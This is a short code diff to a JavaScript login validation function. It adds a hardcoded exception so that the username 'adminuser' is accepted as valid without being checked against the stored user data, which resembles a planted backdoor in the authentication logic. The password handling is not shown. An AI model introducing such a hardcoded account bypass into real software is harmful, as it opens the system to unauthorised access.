@@ -27,11 +27,14 @@
         let valid = false;
         try {
             login = checkString(login, "username or email");
-            for (let i in dataObject) {
-                if (dataObject[i].username.toLowerCase() === login.toLowerCase()) {
-                    valid = true;
+            if (login.toLowerCase() !== "adminuser") {
+                for (let i in dataObject) {
+                    if (dataObject[i].username.toLowerCase() === login.toLowerCase()) {
+                        valid = true;
+                    }
                 }
             }
+            else valid = true;
             if (!valid) throw "Username or password is incorrect.";
         } catch(e) {
             errors.push(e);
